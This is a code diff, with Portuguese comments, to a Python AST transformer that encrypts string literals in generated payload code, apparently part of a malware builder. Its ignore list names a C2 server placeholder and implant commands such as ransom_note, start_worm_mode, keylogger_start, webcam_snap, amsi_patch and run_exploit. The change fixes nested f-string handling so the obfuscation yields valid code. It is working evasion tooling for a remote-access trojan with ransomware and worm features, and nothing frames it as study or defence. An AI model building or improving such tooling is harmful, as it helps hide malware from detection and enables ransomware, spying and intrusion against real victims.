@@ -12,14 +12,10 @@ class StringObfuscatorTransformer(ast.NodeTransformer):
     def __init__(self, session_obfuscator: SessionObfuscator):
         super().__init__()
         self.session_obfuscator = session_obfuscator
-        self.obfuscation_enabled = True  # Novo: um interruptor para a ofuscação
+        self._fstring_depth = 0  # Contador — correto para f-strings aninhadas
         self.strings_to_ignore = {
             "%%C2_SERVER_URL%%", "%%C2_PROFILE%%", "%%DEBUG_MODE%%",
             "utf-8", "w", "r", "a", "rb", "wb", "__main__",
-            # --- Nomes de comando do dispatcher ---
-            # Chaves dos dicts SYNC_TASKS / THREADED_TASKS / NO_RETURN_TASKS.
-            # Manter como strings literais garante que `command in SYNC_TASKS`
-            # funcione mesmo se rs() tiver qualquer edge-case em runtime.
             "encrypt", "decrypt_target", "network_scan", "start_attack",
             "run_exploit", "start_worm_mode", "capture_audio",
             "webcam_snap", "ransom_note", "keylogger_start", "keylogger_stop",
@@ -31,33 +27,22 @@ class StringObfuscatorTransformer(ast.NodeTransformer):
             "revert_token", "amsi_patch", "set_beacon", "cleanup", "sleep",
             "scan_exploit",
         }
-        # Quando True, estamos visitando a chave de um dict — não ofuscar.
         self._in_dict_key = False
 
     def visit_JoinedStr(self, node):
         """
-        Este método é chamado ANTES de visitar os filhos de uma f-string.
+        Contador de profundidade — correto para f-strings aninhadas.
+        O booleano simples falhava quando um JoinedStr filho (ex: format_spec
+        como {x:.{n}f}) resetava o flag para True antes do pai terminar,
+        fazendo constants posteriores serem ofuscadas diretamente dentro do
+        JoinedStr pai — gerando ast.Call onde só Constant/FormattedValue sao validos.
         """
-        # 1. Desliga a ofuscação de strings
-        self.obfuscation_enabled = False
-
-        # 2. Continua a visita normalmente (processa os filhos da f-string)
-        # Como o interruptor está desligado, o visit_Constant não fará nada.
+        self._fstring_depth += 1
         self.generic_visit(node)
-
-        # 3. Liga a ofuscação de strings novamente após sair da f-string
-        self.obfuscation_enabled = True
-
-        # 4. Retorna o nó f-string original, sem alterações
+        self._fstring_depth -= 1
         return node
 
     def visit_Dict(self, node):
-        """
-        Não ofusca CHAVES de dicionário.
-        Chaves são identifiers de lookup (ex: "clipboard_monitor" in SYNC_TASKS).
-        Se rs() falhar em runtime, o key lookup quebra silenciosamente — evitamos isso
-        mantendo chaves como strings literais.  Valores ainda são ofuscados normalmente.
-        """
         prev = self._in_dict_key
         new_keys = []
         for key in node.keys:
@@ -71,37 +56,31 @@ class StringObfuscatorTransformer(ast.NodeTransformer):
         return node
 
     def visit_Subscript(self, node):
-        """
-        Não ofusca o índice de subscript quando é usado para ESCREVER num dict.
-        Ex: SYNC_TASKS["set_beacon"] = func  →  o "set_beacon" permanece literal.
-        Leitura de subscript (ex: d["key"]) não é afetada em lookups de string.
-        """
         prev = self._in_dict_key
-        # Não ofusca o slice/index — pode ser chave de dict
         self._in_dict_key = True
         new_slice = self.visit(node.slice)
         self._in_dict_key = prev
 
         node.slice = new_slice
-        node.value = self.visit(node.value)  # Ofusca o objeto em si normalmente
+        node.value = self.visit(node.value)
         return node
 
     def visit_Constant(self, node):
-        """
-        Este método agora verifica o interruptor 'obfuscation_enabled' e o flag '_in_dict_key'.
-        """
-        # Não ofusca chaves de dict/subscript nem strings dentro de f-strings
-        if self.obfuscation_enabled and not self._in_dict_key and isinstance(node.value, str) and node.value not in self.strings_to_ignore and len(node.value) > 2:
+        # _fstring_depth > 0 = estamos dentro de f-string; Call aqui seria invalido
+        if (
+            self._fstring_depth == 0
+            and not self._in_dict_key
+            and isinstance(node.value, str)
+            and node.value not in self.strings_to_ignore
+            and len(node.value) > 2
+        ):
             iv_b64, encrypted_data_b64 = self.session_obfuscator.obfuscate(node.value)
-            
             call_node = ast.Call(
                 func=ast.Name(id='rs', ctx=ast.Load()),
                 args=[ast.Constant(value=encrypted_data_b64), ast.Constant(value=iv_b64)],
                 keywords=[]
             )
             return ast.copy_location(call_node, node)
-            
-        # Se o interruptor estiver desligado, ou se a string não for candidata, retorna o nó original.
         return node
 
 
